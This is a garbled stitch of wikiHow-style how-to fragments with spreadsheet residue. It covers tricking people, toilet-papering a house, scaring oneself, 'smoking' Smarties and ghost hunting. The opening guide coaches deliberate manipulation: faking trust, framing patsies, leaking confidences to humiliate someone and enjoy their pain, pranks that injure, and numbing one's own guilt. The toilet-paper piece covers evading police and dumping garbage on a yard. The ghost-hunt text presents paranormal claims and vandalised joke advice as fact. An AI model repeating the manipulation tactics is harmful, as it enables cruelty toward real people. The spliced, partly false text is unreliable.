, Your target should have what you want to gain, be it money or cheap laughs, and should view you as credible. You will want to approach the person openly and without any apparent guile, so it should be someone you have no issues being friendly with. They will also need a sense of humor if your trick is to go over without hurting their feelings significantly. You will want to survey the target's behavior and hobbies, depending on how much you plan on developing the relationship for the trick.


Identify potential secondary targets for manipulation. These will be your confederates (people who help you perform the trick) and possibly your patsies (those you can blame the trick on or enlist as dupes) if your trick is mean enough to require someone else to pawn the blame off on. You can enlist them into your trick using either simple honesty (getting them in on the joke) or through tricking them. Confederates are liable to want a cut of whatever you stand to gain, since they are potentially taking risk and are key players in your potential trick. It is important to keep them happy.
Keep your true objective to an inner circle. Lying is detectable through verbal and nonverbal language.Increasing confederates who also use deception will increase your odds of detection. Pick who you trust with your objective carefully, depending on your deception.

, Tricking someone will require, to some extent, modifying your behavior to communicate falsity as truth. If you don’t know the person you’re tricking very well initially, developing a false identity can be useful, as long as the details remain consistent and you avoid compromising the secondary identity.


Choose an identity that the mark will respond well to. Offering expertise and a similar basis of identification (if they are a gamer, you should identify to them as one as well) will make you much more appealing and put you in a much better position to trick this person. It should not diverge from your real life identity unless you plan on cutting off contact with the person after you perform the trick.

, You will need a reason for your confederate to trust you enough for you to trick them later, and you can accomplish this with an identity that they find valuable (an expert in the field they want) or through encouraging a relationship of reciprocity and honesty. Encourage buy-in through exchanging favors, and offering gratitude when things are done through you. People are more likely to offer trust and favors to people who they already have helped. You should approach them with a reasonable request for a favor that they would be inclined to perform. If they are tired or exhausted they are more likely to acquiesce to your request.

, You can use your confederates here, offering either false reports or reports that will distort your mark’s perception of you. Returning favors and respecting reciprocity in the early stages of your relationship will help with this. You will want to make sure that your mark believes you are who you say you are, and that your intentions are not dishonest. Your mark should have a false sense of knowledge about you and you behaviors.

, Your mark’s vanity can be appealed to through mirroring, using their name repeatedly, nodding, use of positive words, repeating their statements and not criticizing their statements. Mirroring a person’s behavior and attitudes will make them more empathetic and receptive to your behavior and attitudes.Avoid being a bobble-headed sycophant hear, as people do not respond to excessive flattery or obvious, conscious mirroring. The affectation should be subtle, and something you've practiced.

, Your confederates should know when to enter, what to say, and what to do. Your patsy should already be implicated, if you are putting the blame on someone else. You should be certain that you can execute the trick quickly and effectively before you initiate it, as you only really have one chance.

, You can use your trust at this point to execute any number of short or long cons, simple tricks or pranks, depending on what you want from who you’re tricking. Small tricks will work the most effectively and not jeopardize your relationship with your mark. You can use the basic structure of the tricks below to affect the deception, though it is important to modulate how cruel the trick is to how much you like the person and how much you desire to continue the relationship.


Abuse semantics in prop bets. You can use old tricks like “I bet I can get a quarter from under a napkin without lifting up the napkin,” or similar things, to trick the person into lifting the napkin for you and getting the quarter.
Betray their confidence to embarrass them. If you’d like to simply shame or humiliate the person, you can use the trust in the relationship you’ve built up against them. Obtaining and then disseminating any sensitive information they might’ve given you in public or to some party they don’t want to know will allow you to shame the person and hopefully take pleasure in their pain.
Prank them. You could lead them, a la Carrie, into a situation where they believe they are to receive a reward or some innocuous thing and instead cause some injury or harm to their appearance, like how in Carrie they covered her in blood at the dance.

, Assuming you are intent on hiding your role as the originator of the trick, you will want to feign sympathy, ignorance, and innocence to hide your role in the trick. How you react to the trick’s immediate consequences on the victim will alter your relationship with the tricked. If the trick went over well, feel free to identify yourself as the originator the conspiracy.

, This will help you at the very least in future attempts to trick others, and keep your actual reputation high.Reports of deception will make people more suspicious of you, even of true statements you might make. It will also be a lot easier to place the blame on someone else for something that is not particularly offensive or reputation endangering.

, If your prank was harmless this should be simple, but if it was not, you will want to focus on minimizing feelings of guilt. Lies to cover transgressions are especially visible, and one should try to avoid perceiving the trick as a transgression, even if it is one. You will likely have to lie to yourself about the consequences of your trick so the ethical considerations can be treated more trivially. , When you’ve finished the initial prank, unless you’ve done a very good job hiding yourself, your mark will likely be more suspicious and more likely to call statements or propositions dishonest. Your ability to remain undetected is key to pulling off a trick again, maintaining a reputation as an honest person (which is ironically key to being successfully dishonest). If your trick fails, you should be willing to give it up.

, Running a secondary trick on someone using these techniques to establish one person as guilty will be key to evading guilt. You will want this person to be a confederate your other confederates know to turn on, or an absent, uncredible, or disliked person, to minimize the chance that they expose your secondary trick. It can be difficult to place the blame on someone else, but if the prank is public and well-received, your patsy would be more inclined to take the ""credit"".

Ding and ditch.",How to Toilet Paper a House," Maybe one of your friends has been sitting a little too high on the horse lately. Maybe your neighbor's Thunderbird woke you up one too many mornings in the last month. Maybe your basketball coach just deserves it. Find someone who deserves and will appreciate a good toilet paper prank, then cue the maniacal prankster laugh.


Pick someone convenient, but not too convenient. It might be easy to TP (Toilet Paper) your neighbor after she stole your basketball, but won't you be an obvious suspect? If it's retribution you're after, wait a couple weeks until the suspicion will have died down some.
Papering someone's house and yard can be a great and harmless prank, but only so long as you know the person well enough to play a joke on them. Done to strangers, it can seem kind of ominous. Make sure you pick someone who'll take it in good fun. TPing someone you don't know stands more of a chance of getting you into trouble. Spread fun mischief, not cruelty.;
, Toilet-paper team, assemble! You want enough kids to have fun and cause havoc, but not too many so you become conspicuous. A good group should be more than two, but probably less than five or six people to be on the safe side.


Going on a TP run can be a great way to build teamwork and share fun experiences. Friends from school or teammates on a sports team make excellent TP companions. Staying out late and getting into some good-natured fun is a great way to build camaraderie.
Plan a TP mission for a sleepover you've got planned to get people in the same place at the same time, or else stick with a group that all lives close to the same neighborhood and find a target equally close to everyone.
No snitches. Don't invite anyone who'll cloud the evening with bad vibes and second-guessing. If you've got a good friend you want to invite, but he isn't into mischief, let him stay home tonight.

, Rolling a house isn't the time to go cheap, or buy weak post-consumer trash. Go big! Get some solid two-ply or you might as well stay home. You'll likely need at least a few rolls per person. The more the better.


The best kind of toilet paper to get is double rolls. It lasts much longer, so you can usually get 4 or 5 throws over a moderately sized tree, and the heavier weight makes it easier to throw accurately. In addition a single cheap roll of toilet paper will only get 2 or 3 throws over a tree.
Buy your stash well before dusk, and try to hit up a few different stores to avoid looking suspicious buying toilet paper at 10:00 at night with ten other kids dressed in hoodies. For the safest choice, have everyone buy their TP separately to avoid looking conspicuous.

, It should be late enough to avoid suspicion, but not so late you'll be conspicuous. Probably don't pick 7:30, when neighbors are still up and walking their dogs. Be sure to get information on how late the neighborhood usually stays up. This can be very useful, and sometimes not knowing how late to go can be very embarrassing when you show up somewhere with a bunch of bags. 12:30 or 1 is a nice round hour for toilet paper.


Many towns have curfews for underage kids. Find out if your town has one, and try to stay close to the time-limit, or you risk getting into extra trouble if you get caught. This is usually the reason cops find a reason to get involved in simple pranks.
If it is during summer, pick a weekday, when most adults will go to bed pretty early. During the rest of the year, it is good to pick a night when you have the following day off school. The day before Spring Break, or days during Presidents' Weekend are very good days to hit.

, During the daylight hours, take a walk around the neighborhood of the home you're planning to hit. Make sure that there are no obvious 24-hour security cameras, or barking dogs to worry about. If it looks particularly difficult, it's better to find out when you're not there in the middle of the night with a bag full of toilet paper and shaving cream. Save yourself enough time to find another target.

, Toilet paper is a funny prank, but vandalism is a crime. While it's true there's a fine line, it's important to know that line and to stay on the right side of it, or you risk getting into serious trouble. That means you need to leave the eggs and the spray paint at home.


Don't tag someone's house with especially cruel or taunting language. A good TP job is funny and probably somewhat embarrassing for the victim, but it shouldn't be mean-spirited.

, While there's not generally a law against ""TP-ing"" anywhere in the books, littering, trespassing, and vandalism are all illegal, and toilet-papering the wrong house is likely to get you in trouble, with the homeowner and with the police.


Sneaking into someone's yard in the middle of the night to TP their house might arouse sleepy and grumpy gun-owners, under the impression they're being robbed. Trespassing carries with it grave risk.

, Before you all head out for your mischief, plan out who is going to be in charge of which area of the yard, who will carry the different items, and how long you're going to take before you call it quits. Plan your prank as specifically as possible, so you don't have to talk much at the scene. When you get there, keep quiet and work fast to avoid getting into trouble.


If you must speak, employ the use of ""code names."" Homeowners have caught TPers because they heard the TPers calling their friends ""by name"" in the yard. Naturally the TPers are usually known by members of the victimized household. Might as well pick a rad one, like Snake Jam or Sheamus.
Put all phones on vibrate, and never take them out while you're working.You don't want an alarm go off at an awkward time, or to light up the yard with iPhone glow. If possible, don't take your phone at all!
If someone sneezes, or you trip over a stick, don't worry too much. No one is going to get up in the middle of the night for a minor noise. They will, however, wake up and look out the window if the noise persists. So stop the noise ASAP, but don't run away until there's a good reason.

, A black hoodie might be the perfect top for creeping, but think beyond the camo. If you have to take off running, you'll be able to duck around a corner and take off your dark top layer to stash it, as long as you've got something different underneath. Then you will be seen wearing a new light color, tricking people who might end up in pursuit.


Instead of black, wear navy blue clothing and shoes. You can also wear dark greens, brown, and greys to keep with the dark theme. Everyone dressed all in black tends to look pretty suspicious, so don't dress in comical costumes like you're going to rob a bank in a movie. No ski-masks, please.

, They call 'em sneakers for a reason. If you need to run on pavement you'll need some good and comfortable athletic shoes. Leave the wedges and the flip-flops at home. Anyone who decides to pop out of the house might not have shoes on, so if they want to give chase, you'll likely be able to out run them on the concrete.

, Stay quiet, walk quiet, and and move fast. It's better to walk to the house, but if you're too far away to walk and end up in a car, park around the corner and approach from different directions. A gang of black-clad teenagers carrying toilet paper looks suspicious to someone glancing out their window.

, You didn't intend to just drop a bunch of TP on the grass, did you? To make sure you get as much paper off the roll and into the trees as quickly as possible, pull off a good 2 or 3 feet (0.6 or 0.9 m) of paper and grasp the end firmly in your non-throwing hand. In the other hand, hold the roll itself.


You can also pull a couple feet off and let the end sit at your foot, secure it in place with your foot on the ground.
You don't have to hold onto the end of the paper at all, if you choose not too, but it's a good way to make sure you won't just lob the whole roll into the tree without it unraveling.

, You can waste a lot of valuable time if you don't throw the roll properly, so it unrolls as it flies. It should be more like a football and less like a dead duck. Hold the roll with the paper trailing back off the top of your hand, as you cock your arm back, then let it roll off your fingertips when you throw it at your target, so the end stays at your feet, or in your other hand, and the roll unrolls over the tree of your choice.

, Start with a tree with some good branch candidates. Throw the roll above the branches you want to paper, so it trails up and over beautifully, and plunks on the ground on the other side.


Aim low and aim high. If the branches are too high, or too thick, it is possible to get the roll stuck. Try not to worry too much, but aim at a more high-probability target with your next roll.
If you only get the lower branches, it can easily be taken down. You want your hard work to stay for at least a couple days, right? Get creative.

, Work your way around the tree until the roll runs out. The best TP jobs are like the work of an intricate spider, going back through the branches, between multiple trees, wrapping around the car and then back through the first tree. Use as much of each roll as you can. Don't leave rolls sitting on the ground. Mummify that tree!

, You don't necessarily have to chase down all your rolls. If your friend's lands at your feet, toss it back over to keep the process going smoothly and quickly. The resulting TP job will look more random and chaotic that way, an ideal outcome.

, The trees are the first, best, and most-obvious target. But a truly great toilet-papering takes no prisoners. Within a single roll, you can get creative and try to hit as many different places as possible, or use many rolls to super-coat every single target you paper.

, Waking up to find a couple rolls of toilet paper in one of your trees isn't that big of a deal. It'll only take a few minutes to clean up. Imagine waking up to find your car completely surrounded by TP. That's more like it.


If you can, bring a spray bottle or a bottle of water, wet the surface of the car with it before wrapping the car, rolling the paper underneath and going back up and over. Getting the bottom layer soggy will create a sloppy, clingy mess, but not any permanent damage.

, Secure the end of the roll at one end of a fence and weave the rest of the roll through it, wrapping around individual posts and between them. Do the same things for any decorative bushes that might line the yard.

, Lots and lots of small pieces are super-annoying.

, 5 letters or less. Celebratory slogans are preferable, like ""You lose,"" or something stupid, like ""DUDE.""


Nothing mean or cruel. This is a prank, not vandalism. Leaving cruel slogans or taunts is a good way to get in trouble with the cops, if it could be considered a threat.

, The holy grail of the TP job is getting the roll all the way over the house. This absolutely has to be the last part of the job, however, because the plunk of TP on the roof can cause a racket that'll get you caught. You need to be very careful and get your best thrower on the job, or all do it at the same time to see who can throw the farthest. Then take off running.

, Bring along a couple cans of cheap shaving cream to spray on the yard, or to use to stick toilet paper to the trees. It can be risky, because the cans make a loud sound, but if you do it quick and dirty, you can get away with it. Give shaving cream smiley faces to the shrubbery.


Make a weirdo pile of wadded-up toilet paper and shaving cream in the middle of the yard, like a goo mountain. Nobody will want to stick their hands into it to clean it up.
Never use shaving cream on cars, the house, windows, or driveways, because it can cause stains that might cause permanent damage. That would up your prank to a misdemeanor. Don't do it.

, Instead of taking out the garbage the night before you going on your TP run, save it. Dump it in the middle of the yard. Banana peels, apple cores, candy wrappers. It'll be a chore for someone else to clean up.


Make sure there's no incriminating evidence, like a telephone bill with your name on it, before you hand it over to the enemy.

, Stack the chairs in the yard, or line them all up facing the street. Put the gnomes and lawn geese up on the porch after wrapping them up with toilet paper and give them shaving cream mustaches.

, A common homecoming week prank is to leave a bunch of forks stuck into someone's yard, as if the yard had suddenly sprouted utensils in the moonlight. Plastic forks are fine, or you can collect cheap dime-store forks for a couple weeks leading up to your big prank.


If you want to fork someone, assign the job to one person in your crew, because it can take a while to do right. try to line them up as straight and as uniform as possible for the maximum effect.

, Are you brave enough to ring the doorbell at the end of the night? If so, have everyone else in the group take off around the corner and have your most courageous toilet paper warrior brave the long steps up to the front door. Done properly, it can be the best and most satisfying nightcap."

Shocking ""popup"" and ""screamer"" videos came to popularity in the early days of the internet and have been a staple online prank ever since. Usually, these videos show a simple, pleasant scene or animation to lull you into a false sense of security, then have a horrifying image suddenly appear, accompanied by loud noise. It's cheap, but effective, and if you've never seen a jump scare video before, it's almost impossible to not be scared by one.

, Good scary movies pack a lifetime's worth of scares into two hours or less. Want a fun, scary way to spend the evening? Invite a few friends over for a movie night and watch a scary movie no one has seen before — if you're lucky, you may experience dozens of excellent jump scares in a single night!


Here is a brief list of horror movies that contain at least one truly shocking jump scare — many contain more.

Insidious
The Descent
The Ring
The Exorcist III
The Thing
Audition
Mulholland Drive (this is not a horror movie but contains a single profoundly scary jump scare early in the film), While it may once have seemed unlikely that video games could ever compete with horror movies, some games today are seriously scary. Even more so than with scary movies, scary video games allow you to personally experience the events happening on screen — since you have some control over the events of the game, you're naturally invested in what's happening (and, thus, you're extra-vulnerable to getting scared!) Some games that are considered to be among the scariest of all time are listed below (there are many more):Slender (Windows, Mac) (Free to download)
Amnesia: The Dark Descent (Windows, Mac, Linux)
Most games in the Silent Hill series (many platforms — consult the wiki for more information)
Five Nights at Freddy's and its sequels Five Nights at Freddy's 2,3,4, and Sister Location (Windows and mobile)
Condemned: Criminal Origins (Xbox 360 and Windows)

, Is it late September or October? If so, there may be chance that there are one or more haunted houses open around you. Haunted houses can be great fun with friends or significant others (they can even make great dates if your sweetheart has the right temperament.) If you're truly brave, consider going through on your own, but be ready to be scared witless — many haunted house owners take great pride in their ability to shock visitors in new, inventive ways.


If you do go to a haunted house, be sure to use proper etiquette even as you're being scared. Luckily, this is mostly common sense: don't touch the actors, don't try to ruin scares before they happen, and so on. See our article How to Avoid Ticking Off the Actors in a Haunted House for more information.

, If you're willing to put your jump scare in someone else's hands, consider enlisting the help of a trusted friend. Tell your friend that you want to be scared sometime in the next few days and that you don't want to see it coming, then simply go about your life. Beware — assuming your friend remembers to uphold his or her part of the bargain, a nasty scare will be waiting for you just around the corner in the near future!

, Some people enjoy the thrill of being scared so much that they'll actually deliberately seek out things that make them feel like they're in danger but are actually safe. Sound ridiculous? If you've ever gone on a roller coaster, you've done the same thing! Below are just a few ideas for perfectly safe activities that may make you feel like you're in mortal peril:


Going on a roller coaster or amusement park ride.
Standing next to the railing on the observation deck of a tall building.

Rock climbing (indoor; with a harness)
See a thrilling IMAX movie
Going in a full-body computer flight simulator (these are often at science centers, museums, and other educational facilities)

, Phobias are intense, irrational fears that are centered around certain specific things or activities. Almost everyone has something that seems to freak them out more than it freaks out others, but about four to five percent of the population have clinical (medically significant) phobias.If you have a mild phobia (but not a severe one), consider exposing yourself to the thing you dread to give yourself a quick jolt of adrenaline. Only do this if you have no previous history of experiencing fainting or anxiety attacks from your phobia.


Unsure whether or not you have a phobia? The most common phobias are arachnophobia (a fear of spiders), ophidiophobia (a fear of snakes), acrophobia (a fear of heights), necrophobia (a fear of dead things), cynophobia (a fear of dogs), and claustrophobia (a fear of tight spaces). If any of these make you feel a deep dread, you may have a phobia.Note that, unlike all of the other activities in this section, this one has a small (but real) risk of causing lasting distress. People with severe phobias may be paralyzed with traumatizing fear if they attempt to confront their phobia head-on. In this case, the phobia is an issue to seek psychological help for — not something to use for a cheap thrill. See our ""overcoming phobias"" article for more information.

Make your surroundings dark and silent.,

Get ""out of your own head"".,
Think about every terrible thing that could happen this very second.,
If you get too scared, remember — you're perfectly safe.",How to Scare Yourself2," If you're less interested in a single quick jump scare and more interested in the sort of creeping, protracted scare that keeps you up all night, you'll want to start by setting the scene. Wait til nighttime (or go somewhere very dark, like a basement or cellar) and eliminate all sources of ambient noise. Ideally, you want to be able to hear a small object like a marble fall to the floor — this way, you'll find yourself jumping at minor noises you wouldn't normally notice.


Darkness is a very effective ""scare enhancer"" — that is, almost anything that's scary is more scary in the dark. Philosopher William Lyons proposes that people are afraid of darkness not because of the absence of light but, rather, ""because one does not know what might be out there in the dark.""Silence enhances this effect — hear a bookcase shift in the darkness and it's only natural to assume that a serial killer is creeping into your room.
Likewise, being alone can greatly increase the feeling of being creeped out. If you're alone, you have no one to help you when the some unknown terror comes for you in the night — not a comforting thought.

, Though it may at first seem cheesy or childish, getting sucked into a good ghost story is a fantastic way to put yourself ill-at-ease for hours on end. Ghost stories range from mild to absolutely bone-chilling — it's up to you to determine how ready you are to be scared. A few suggestions are listed below:


If you have time to spare, try reading a classic scary novel or short story. Old favorites like The Shining by Stephen King and Ligeia by Edgar Allan Poe are famous for a reason.Looking for something a little quicker? Try browsing online ghost story collections like this one from Americanfolklore.net. There are literally hundreds of these types of stories online that can be found with a simple search engine query.
If you want to read a story that you've definitely never encountered before, try visiting sites like Reddit's ""No Sleep"" subreddit, where users are free to share their scariest stories and experiences.

, Made-up ghost stories not doing the trick for you? Try the real thing. There are numerous instances in history of death, disappearance and worse with unknown explanations, making them essentially real-life ghost stories. Reading these stories can sometimes be worse than reading the darkest fictional ghost story — these things did happen and no one knows why. Some recommendations are listed below:



The Dyatlov Pass Incident: Nine hikers suffered violent deaths in the Ural mountains in Russia in the late 1950s under mysterious circumstances. Their tent appeared to have been cut open from the inside. Some had nonsensical injuries, like burnt hands and skull fractures with no apparent cause. Some of the hikers' clothing was even found to contain significant levels of radiation. No official explanation has ever been given.Elisa Lam: A 21-year-old Canadian tourist was found dead in the rooftop water tank of a Los Angeles hotel after disappearing for almost a month. It is unknown how and why she got into the water tank. In addition, security footage shows her acting erratically in an elevator, leading some to think that she believed herself to be possessed.

The Bell Witch of Tennessee: This apparent haunting inspired The Blair Witch Project. John Bell, a man from North Carolina, moved to Tennessee in the early 1800s and began to experience a wide range of unexplained phenomena on his property before suffering an untimely death from illness. It is unclear how much of John's story is fact and how much is fiction.

, Once you've started to become unnerved, amplify the effect by putting yourself into a paranoid mindset. This is very hard to explain exactly — essentially, you want to give yourself the sense that what you're seeing and sensing is ""unreal"" and that what you perceive to be the world around you doesn't actually exist. Many people find this easiest to trigger by staring at their reflection in the mirror for a long time in a dark, silent room. Eventually, you should get the strange sensation that you're ""out of your own head,"" which can be very chilling, especially if you're already on edge.


Another good way to do this is to try to imagine things that, by their very nature, are impossible to imagine. For instance, sit in a dark room and try to concentrate on what it feels like to be dead. Alternatively, try to imagine what your vision would look like if you had eyes on every side of your head. You won't be able to do these things, but they should help get you into the paranoid, introspective mindset that you want to be in.

, Once you're sufficiently creeped out, all you have left to do is to keep the fire burning by imagining every horrible possibility that could conceivably happen to you. Below are a brief list of suggestions — feel free to add your own deepest, darkest fears. Pleasant dreams!


A serial killer could, at this very moment, come out of the closet and abduct you. It's possible!
You could slowly start losing your mind and fall into dementia. Or have you already?
You could conceivably die while you are asleep and never realize it, making these your very last thoughts ever.
Nuclear war may have already started and you may have minutes before bombs start falling and civilization ends.
The entire universe could, without warning, collapse into nothingness in a fraction of an instant. Scientist already believe that it may have spontaneously been created from nothing., Have you bitten off more than you can chew in terms of scares? Don't worry — everything is fine. You're not in any danger. You are sitting in a dark, quiet room alone and freaking yourself out. There is not a monster in the closet. You will live through the night. Take deep breaths and try reading How to Calm Down for a change of mood.

, Do not try to put all your weight on your feet, crouch so when you lean weight will focus on that direction.

, Do not breath normally. Try to breath quietly and slowly. Do not hold your breath or you will let out a big breath and the person you are sneaking up on will know you are there.

, You can do this with your hands in a back and forth motion or with a hammer, mortar and pestle, your shoe, or anything heavy. Watch for a powdery substance to form that you can see clearly. Do this to all the candies in the package.









Once the smarties have produced a fair amount of dust, you're ready. Grind it for one or two minutes, experiment, then retry with the remaining chunks of Smarties.

, Flatten it out and place your mouth on this end. Suck in with your breath and let the powder get on the top of your throat. You don't want the dust in the bottom of your lungs -- just in your mouth. Smartie dust is not the same as oxygen.









You want to flatten out the end so the Smarties that are still in chunks stay in their packaging and don't get lodged in your throat. It's smoking with Smarties that's the goal, not choking on Smarties.

, You should see a bit of a fog produced. This looks just like smoke -- the Smarties lose their color when ground. Unfortunately, because pink and blue smoke would be awesome. Alas, you'll have to settle for normal wisps of white smoke.

Have full permission for use of the property.,

Notepad - you need to write and log everything that happens.,
Advanced and Optional


Video camera (optional tripod) - Video cameras are an important instrument for an investigation.,
Here's a condensed version of the most popular procedures for conducting outdoor ghost hunts:;
,
Have everyone meet near the location and decide who will work each piece of equipment and divide into teams if necessary.,
Enter the site and either privately or as a group ask for blessing or protection for the duration of the hunt.,
Walk around the area to get a feel for the surroundings and allow the spirits to get a feel for you.,
Get some pictures and recordings.,
Ask the human spirits here not to follow you home and to remain here when you are done.,
Take some pictures.,
Know where to look.",How to Conduct a Ghost Hunt," You could get sued for being on private property, and that can be quite an expensive cost. Or the owner could call the cops and you could get sent to jail. Can't conduct ghost hunts in jail now can you?, There are generally two types of spirits that you may encounter. One was a human at one time and it has remained on this level (Earth) for some reason. It may not know it's dead or it may be held here by unfinished business, guilt, revenge, etc. These spirits are like the person was when they were alive, so they could be good or bad, just like the living, but not normally dangerous. This human spirit is the type you will encounter 95% of the time. You could also witness a residual haunting which is just a playback of a past event. This is just like watching a video from the past playing over and over. The other type of spirit you may encounter was never human and is generally bad news. You must be aware of this type but not be obsessed with them, because the chances that you will encounter them in a regular ghost hunt are slim.

,


Ghost Hunt - going to a place were there have been no sightings of ghosts and trying to catch some on film (video and photos), sounds (audiotape), eyewitness (human), etc. (graveyards are the number one place to start, churches, schools and older buildings too. That's a lot of number one places.)
Ghost Investigation - going to a known haunted place and recording data (video, photos, audio, temperatures), notes, interviews and other evidence to prove/disprove the haunting and to assist the owners and the spirits in moving on and leaving the place if they want that. The assistance can be either you directly assisting the owner with the situation or putting them in contact with experienced groups or individuals that will try to resolve the situation. Your assistance can be something as simple as educating them on what is going on and their options.

,


35mm Camera - Nothing fancy with at least 400 speed film. 800 speed film is also good at night but you'll have to test your cameras flash strength to see which speed works best for you. Even those single use 35mm cameras have gotten good results. If you are a more experienced photographer you may want to try infrared film. You can try Polaroids, too, but it's best to do it along with a 35 mm camera so you can compare the results. When you develop them you don't need to go to a camera shop. The local drugstore or department store is fine. Let them know you want all the pictures developed so that you get the pictures that they might think are bad ones. These ""bad ones"" are normally your best ectoplasm mist photos.
Digital Camera - Regardless of what you've heard digital cameras are great tools for ghost researchers. Once upon a time they had their limitations and problems but that is no longer the case. Not only do they allow you to see instantly if you have a positive photo, they can also take photos in limited infrared range of light.
Flashlight w/ spare batteries - a common sense item. Remember to bring spare batteries for everything, even things that don't take batteries. Due to spirit activity, batteries often run down very fast and you don't want to miss anything because of dead batteries. Spirits eat electricity to make them strong. Try using a red lens flash light to help preserve your night vision.
First aid kit - just in case, it's very easy to trip in the dark and get cut.

, If you don't then you really don't have much research information. An example of this is one investigator that's high gets an EMF reading and never writes it down. Another investigator takes a picture of the same area but is not aware of the reading and gets an anomalous image. Without that EMF reading the picture may be good evidence, but with a report noting the reading, the picture greatly increases in evidence value. Many investigators use a pocket tape recorder instead and that is fine, just make sure you have spare batteries and tapes.
Jackets or weather appropriate clothes - if you are cold you are not at your best and your observation skill could suffer, this would be pretty common sense for most other people.
Wristwatch or pocket watch - so you can log in the times of events and your arrival and departure.

, Unlike still cameras they provide us with constant visual and audio surveillance for review and observation. Hence the name ""video camera"". The video cameras we use are equipped with infrared capability and this is the mode we use. With video any phenomenon occurring can be documented in its entirety. This will show the length of time the phenomenon occurs, what is happening, the conditions surrounding the phenomenon, and possibly even the cause of the phenomenon. You may have noticed this in any videos, movies, or television programs you have watched. The Sony line of camcorders has an infrared night shot feature that enables you to video tape in complete darkness and see beyond what the human eye can see. You can use these on tripods or walk around with them. You should also invest in an infrared light extender which will help your camera see in the darkest places and make the quality of the video better.
Tape recorder w/ external microphone and high grade tapes - recorders or digital voice recorders are without a doubt one of the most important pieces of equipment that you should have in your investigator's toolbox. Audio recorders are used for many different purposes throughout an investigation. Recorders are used for interviews, spontaneous thoughts, your notes and electronic voice phenomena (EVP). You have to use an external microphone when recording electronic voice phenomenon (ghosts voices). If you rely on the internal microphone you will also be recording the internal gears and motors and this will make your tape worthless. Any sound you hear on the tape could not be used as evidence because of this, so use the external mic, they are pretty inexpensive. The type of tape that is most often recommended is high bias tapes or metal tapes.
Digital audio recorders - This recorder is small and easy to carry. You can also use the voice activation feature so there is less audio to review. Most units record the time of the recording as well which is very useful. When using audio recorders be sure to state the location, time of investigation, and investigators names. When recording investigators' names it would be wise to have each individual present state their own name, which will make it easier for distinction amongst voices heard on the tape during review. Voice activation mode should be deactivated on tape recorders during use when electronic voice phenomena is trying to be achieved due to the fact that it usually cuts off beginnings of words, sentences, and phrases. This is not necessary with digital recorders and they actually seem to work better in voice activation mode.
EMF Detector - The Electromagnetic Field Detector, also known as an EMF, is the modern day ghost researchers' tracking device, a very important piece of equipment. With this instrument it is possible to locate and track energy sources. It will detect fluctuations in electromagnetic fields and low strength moving EMF fields that have no visible source. It is a common theory that spirits disrupt this field in such a way that you can tell one is present by higher than normal readings with this meter. Spirits enjoy nothing more than to fool around with electricity and/or magnets. Before using the EMF as a ghost research tool on an investigation be sure to walk around the area and take initial readings around energy sources such as light poles or electrical outlets to be sure of the readings you receive while scanning the area during the investigation. Most units when purchased come with a manual describing most household and major appliances and their corresponding electromagnetic reading. When using the EMF as a tracking device look for fluctuations of 2.0 to 7.0 in whatever units you feel like using. This usually indicates spirit presence. Anything higher or lower normally has a natural source.
Cellular phone - if you have one it can come in handy in case of an emergency.
A Compass - it's a useful instrument to an investigator due to its compact size and low cost price. (Gravel or small pebbles are even better in this respect.) When used on an investigation this will indicate spirit presence when the needle cannot come to a precise heading or spins/moves erratically. This works on the same principle as an EMF meter. Except that compasses don't detect electric fields, they detect magnetic fields.
Candles & matches - batteries often run low during hunts so you may run out of them and still need a light source. Another good idea is a camping lantern that runs on lamp oil. Be careful using the candles around motion detectors, they will set them off. Also try to avoid setting yourself or one of your fellow investigators on fire, as that can ruin a perfectly good video.
Motion Detectors - these can be used to sense movements by often unseen forces or spirits. You can get battery operated ones for about 20 dollars and they are great for inside but can be used successfully outdoors as well; just watch the placement. You don't want a tree branch or squirrel setting it off.
Thermometer or Thermal Scanner - a thermometers is an instrument that is also very useful. It is a device that can be used to sense and detect the level of temperature, as well as any thermal fluctuations that may occur due to spirit activity. There are two types used: regular digital thermometers and infrared non contact thermometers. When used on an investigation this will aid as a detection system for spirit presence. Rapid temperature drop of 10 degrees or more could indicate spirit presence. Try using the infrared non contact thermometers because they react in less than a second to a temperature drop and you can scan a large area quickly.
Hand Held Radios or Walkie-Talkies are very useful in a large outdoor area and a building with groups spread out in various rooms. These work on the same principle as the cell phone, but do not usually require a credit check. They could be great in emergency situations or just to rotate groups. Be sure to be aware they could interfere with your EVP recording though. Not sure what you might do about that, but be aware that you may be screwing up and have no way to avoid it.

,, Pick a person or leader that will talk to anyone who comes in contact with the group (i.e. Police, Reporters, Priests, Alien Visitors, Park Rangers, etc.)

, Or for longer than that if you are enjoying your life so far. You can use this time to put yourself in a positive frame of mind and/or to take a precautionary pee. It does not have to be a religious thing so everyone can do this in some way. Take the 10 seconds this takes and do this. What can it hurt? It's better to be safe than sorry. Many experienced groups believe that there are evil spirits in many areas such as cemeteries and by saying a 10 second prayer or making sure you are in a positive frame of mind you can safely go about your business without worrying about them. These may be evil spirits, but they are grotesquely incompetent evil spirits who can be defeated by thinking positive. An experienced demonologist will tell you that by doing this in the name of God or Brahma or Coyote or Odin or Amaterasu Omikami or Chuck Norris or whatever good deity you worship, you will keep any non human spirits at bay since they have to leave you alone when told so in this manner. Spirits believe in all gods, even the extremely silly ones, and are very afraid of them.

, If you are especially concerned about putting the spirits at ease, take off your clothes. Spirits cannot wear clothes and are nervous around people who can. Do this for about 20 minutes. Log in your start time and weather conditions and any other relevant information. You can also begin to set up any stationary equipment like camera on tripods or motion detectors. Make note of any areas that may cause you to get false readings or false positive pictures.

, Be sure to note anything unusual that happens especially meter and temperature readings, visual sightings and strange sounds. Also make notes of any feelings or emotions you feel that may be odd or out of place. You can compare notes after the hunt and look for similarities in readings and feeling in certain areas or at certain times.


Whether you stake out a spot or you walk around try to give everyone the opportunity to try everything and be everywhere. This keeps every one fresh and at attention. Rotate a few times during the investigation.

, Tell the others they must remain here and STAY here in the name of God or Jesus Christ or Baal or the Great Spirit or Ishtar or L. Ron Hubbard or Vishnu or Osiris (or other good deities). Again this takes 4 or 7 seconds, it's simple and it can save you some problems down the road. If we are wrong about these prayers at the beginning and end of the hunt and they are not necessary then you wasted 14 or 17 seconds of your time. If we are right about them, you saved yourself from a lot of problems and grief.

,


For 35mm cameras: Open your film and load your camera after walking around the location for about 20 minutes first. Make sure to expose it all to plenty of light before loading it, to ""prime"" the film.
For 35mm cameras: Use at least 400 speed 35 mm film. 400 and 800 speeds work the best. Black and White film also works well.
For 35mm cameras: If you are an experienced photographer, you may want to try infrared film which also has had excellent results in the past.
Make sure you note any other lights in the area so when you view your developed pictures you will not think a street light or some guy mooning you is an orb. This could be very embarrassing.
Make sure you clean your camera's lens regularly.
